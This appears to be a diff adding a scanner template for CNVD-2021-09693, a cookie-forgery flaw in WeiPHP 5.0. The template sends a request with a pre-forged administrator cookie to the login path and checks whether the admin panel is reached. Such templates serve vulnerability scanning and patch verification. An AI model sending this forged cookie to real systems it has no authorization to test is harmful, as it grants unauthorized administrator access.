@@ -1,0 +1,19 @@
+id: CNVD-2021-09693
+
+info:
+  name: WeiPHP5.0 任意用户Cookie伪造 CNVD-2021-09693
+  author: daffainfo
+  severity: critical
+  description: Weiphp5.0 存在管理员用户Cookie伪造，通过泄露的密钥数据，可利用加密方法来得到管理员的Cookie app="WeiPHP"
+  reference:
+    - https://github.com/Threekiii/Awesome-POC/blob/master/CMS%E6%BC%8F%E6%B4%9E/WeiPHP5.0%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7Cookie%E4%BC%AA%E9%80%A0%20CNVD-2021-09693.md
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /public/index.php/home/user/login/from/6/pbid/0
+      headers:
+        cookie: user_id=MDAwMDAwMDAwMLK2onQ
+    expression: response.status == 200 && response.body.bcontains(b'客户端管理')
+expression: r0()
